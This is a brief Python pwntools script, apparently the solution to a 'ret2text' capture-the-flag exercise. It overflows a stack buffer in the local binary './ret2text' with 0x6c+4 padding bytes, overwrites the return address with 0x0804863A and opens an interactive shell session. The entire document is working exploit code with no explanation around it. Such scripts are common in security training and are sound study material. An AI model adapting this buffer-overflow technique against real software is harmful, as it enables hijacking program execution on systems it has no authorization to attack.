##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x0804863A
sh.sendline('A' * (0x6c+4) + p32(target).decode("iso-8859-1"))
sh.interactive()